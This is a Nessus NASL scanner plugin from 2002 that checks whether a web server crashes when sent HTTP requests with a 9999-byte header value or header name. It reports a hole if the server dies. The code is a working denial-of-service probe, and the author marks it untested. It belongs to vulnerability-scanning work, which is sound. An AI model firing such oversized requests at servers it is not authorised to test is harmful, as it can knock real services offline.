#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# I don't even know if it crashes any web server...
# 


if(description)
{
 script_id(11078);
 
 # This probably matches
 script_cve_id("CVE-2000-0182");
 
 
 script_version ("$Revision: 1.11 $");
 name["english"] = "HTTP header overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid request with a too long header name or value.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long HTTP header kills the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

#
r= http_get(item:"/", port:port);
r= r - string("\r\n\r\n");
r= string(r, "\r\n", "Nessus-Header: ", crap(9999), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);
#
r= http_get(item:"/", port:port);
r= r - string("\r\n\r\n");
r= string(r, "\r\n", crap(9999), ": Nessus was here\r\n\r\n");

soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);
#

if (http_is_dead(port: port)) { security_hole(port); exit(0); }
